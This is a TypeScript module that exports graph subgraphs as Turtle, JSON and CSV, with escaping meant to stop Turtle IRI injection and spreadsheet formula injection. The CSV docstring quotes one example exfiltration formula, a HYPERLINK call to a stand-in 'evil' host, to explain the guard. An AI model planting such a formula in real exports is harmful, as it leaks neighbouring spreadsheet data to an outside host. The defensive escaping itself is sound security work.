/**
 * Subgraph export (the export-and-reporting requirement, slice 1).
 *
 * Exports the induced subgraph of a node-id set: the nodes, their
 * properties, and the inter-edges (edges whose BOTH endpoints are in
 * the set: the acceptance shape). An empty selection means the whole
 * graph. Three formats this slice:
 *
 * - Turtle: a deliberately small vocabulary (g3t: terms under a
 *   stable base IRI, rdfs:label from the name property, rdf:type per
 *   UGM type). Provenance IRIs pass through when present, so
 *   round-tripping into a triple store keeps lineage.
 * - JSON: { nodes, edges } with full attributes (the lossless form;
 *   workspace snapshots cover view state separately).
 * - CSV: two tables in one file (nodes, blank line, edges) for the
 *   spreadsheet path.
 *
 * PNG/SVG screenshots are view concerns and live with the canvas
 * (cy.png through the toolbar's export control).
 *
 * @see specs/02-functional-interaction.md R2.11
 */

import type { UGM } from "../ugm";
import { isPseudoNode } from "../projection/pseudo-nodes";

export interface SubgraphSelection {
  /** Node ids to export; empty or omitted exports every node. */
  nodeIds?: string[];
}

interface ExportNode {
  id: string;
  types: string[];
  properties: Record<string, unknown>;
}
interface ExportEdge {
  id: string;
  source: string;
  target: string;
  type: string;
  properties: Record<string, unknown>;
}

function collect(ugm: UGM, selection?: SubgraphSelection) {
  const wanted =
    selection?.nodeIds && selection.nodeIds.length > 0
      ? new Set(selection.nodeIds)
      : null;
  const nodes: ExportNode[] = [];
  ugm.forEachNode((id, attrs) => {
    if (wanted && !wanted.has(id)) return;
    // Pseudo nodes (Brief 06 hubBurst/busCollapse) are a projection-time
    // spreading device; they and their incident edges never leave via
    // export. Dropping the node also drops its edges below (the present
    // set never includes it).
    if (isPseudoNode(attrs)) return;
    nodes.push({
      id,
      types: [...(attrs.types ?? [])],
      properties: { ...attrs.properties },
    });
  });
  const present = new Set(nodes.map((n) => n.id));
  const edges: ExportEdge[] = [];
  ugm.forEachEdge((id, attrs, source, target) => {
    if (!present.has(source) || !present.has(target)) return;
    edges.push({
      id,
      source,
      target,
      type: attrs.type,
      properties: { ...attrs.properties },
    });
  });
  return { nodes, edges };
}

// ── Turtle ───────────────────────────────────────────────────────────

const BASE = "urn:g3t:";

function iriSafe(local: string): string {
  return encodeURIComponent(local);
}

/**
 * Characters an IRIREF (`<...>`) may not contain: Turtle forbids
 * `<>"{}|^\` and backtick outright, plus everything at or below U+0020.
 * A `>` or a newline inside the brackets does not produce a malformed
 * document, it produces a DIFFERENT one, which is the whole attack.
 */
// eslint-disable-next-line no-control-regex -- the U+0000..U+0020 range is the point
const IRI_FORBIDDEN = /[\u0000-\u0020<>"{}|^`\\]/g;
/** Scheme prefix. A relative IRI would silently resolve against BASE. */
const ABSOLUTE_IRI = /^[A-Za-z][A-Za-z0-9+.-]*:/;

/**
 * A provenance value as an IRIREF body, or null if it is not an IRI.
 *
 * `provenance_iri` is a node PROPERTY, so it arrives from an adapter
 * response or an imported document: data this toolkit treats as
 * external everywhere else. It used to be stringified straight into
 * `<...>`, so a value ending the bracket and opening its own subject
 * wrote attacker-chosen triples into the .ttl an analyst then loads
 * into a triplestore. Percent-escaping keeps the value addressable
 * while confining it to one term.
 */
function turtleIri(value: unknown): string | null {
  const raw = String(value);
  if (!ABSOLUTE_IRI.test(raw)) return null;
  return raw.replace(
    IRI_FORBIDDEN,
    (c) =>
      `%${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(2, "0")}`,
  );
}

function turtleLiteral(value: unknown): string {
  if (typeof value === "number" && Number.isFinite(value)) {
    return Number.isInteger(value) ? `${value}` : `${value}`;
  }
  if (typeof value === "boolean") return value ? "true" : "false";
  const s = String(value)
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r");
  return `"${s}"`;
}

export function exportSubgraphTurtle(
  ugm: UGM,
  selection?: SubgraphSelection,
): string {
  const { nodes, edges } = collect(ugm, selection);
  const lines: string[] = [
    `@prefix g3t: <${BASE}> .`,
    "@prefix rdfs: <http://www.w3.org/2000/01/rdf-schema#> .",
    "@prefix rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#> .",
    "@prefix prov: <http://www.w3.org/ns/prov#> .",
    "",
  ];
  for (const n of nodes) {
    const subject = `g3t:node-${iriSafe(n.id)}`;
    for (const type of n.types) {
      lines.push(`${subject} rdf:type g3t:type-${iriSafe(type)} .`);
    }
    const name = n.properties["name"];
    if (name !== undefined) {
      lines.push(`${subject} rdfs:label ${turtleLiteral(name)} .`);
    }
    for (const [key, value] of Object.entries(n.properties)) {
      if (key === "name" || value === undefined || value === null) continue;
      if (key === "provenance_iri") {
        const iri = turtleIri(value);
        // Reported in band rather than dropped in silence: this file is
        // read by a person, and lineage that vanished is worth a line.
        // The subject is already escaped, so the comment cannot break
        // out of itself; the value is deliberately not echoed.
        lines.push(
          iri === null
            ? `# omitted prov:wasDerivedFrom for ${subject}: provenance_iri is not an absolute IRI`
            : `${subject} prov:wasDerivedFrom <${iri}> .`,
        );
        continue;
      }
      lines.push(
        `${subject} g3t:prop-${iriSafe(key)} ${turtleLiteral(value)} .`,
      );
    }
  }
  lines.push("");
  for (const e of edges) {
    lines.push(
      `g3t:node-${iriSafe(e.source)} g3t:rel-${iriSafe(e.type)} g3t:node-${iriSafe(e.target)} .`,
    );
  }
  return lines.join("\n") + "\n";
}

// ── JSON ─────────────────────────────────────────────────────────────

export function exportSubgraphJson(
  ugm: UGM,
  selection?: SubgraphSelection,
): string {
  const { nodes, edges } = collect(ugm, selection);
  return JSON.stringify({ version: 1, nodes, edges }, null, 2);
}

// ── CSV ──────────────────────────────────────────────────────────────

/**
 * Leading characters a spreadsheet reads as the start of a formula
 * rather than as text, tab and CR included.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
/** A plain number, which is data and must not be quoted into text. */
const NUMERIC = /^-?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;

/**
 * A CSV cell, escaped for the delimiter AND for the spreadsheet.
 *
 * Ids, types and property values come from adapter responses and
 * imported documents, and this module's docstring names the
 * spreadsheet as the intended consumer, so the dangerous sink is the
 * designed one: `=HYPERLINK("https://evil/"&A2,"x")` exfiltrates
 * neighbouring cells on click. A leading apostrophe is the standard
 * guard; Excel, LibreOffice and Sheets all read the rest as text.
 *
 * Negative numbers are exempt. `-5` is data, and quoting it into
 * `'-5` would break the arithmetic this export exists to enable, so
 * the guard applies only to leading characters that do not begin a
 * plain number. `-1+1` is not one, and is guarded.
 */
function csvCell(value: unknown): string {
  if (value === undefined || value === null) return "";
  let s = typeof value === "object" ? JSON.stringify(value) : String(value);
  if (FORMULA_LEAD.test(s) && !NUMERIC.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function exportSubgraphCsv(
  ugm: UGM,
  selection?: SubgraphSelection,
): string {
  const { nodes, edges } = collect(ugm, selection);
  const nodeKeys = [
    ...new Set(nodes.flatMap((n) => Object.keys(n.properties))),
  ].sort();
  const out: string[] = [];
  out.push(["id", "types", ...nodeKeys].map(csvCell).join(","));
  for (const n of nodes) {
    out.push(
      [n.id, n.types.join(";"), ...nodeKeys.map((k) => n.properties[k])]
        .map(csvCell)
        .join(","),
    );
  }
  out.push("");
  const edgeKeys = [
    ...new Set(edges.flatMap((e) => Object.keys(e.properties))),
  ].sort();
  out.push(
    ["id", "source", "target", "type", ...edgeKeys].map(csvCell).join(","),
  );
  for (const e of edges) {
    out.push(
      [
        e.id,
        e.source,
        e.target,
        e.type,
        ...edgeKeys.map((k) => e.properties[k]),
      ]
        .map(csvCell)
        .join(","),
    );
  }
  return out.join("\n") + "\n";
}
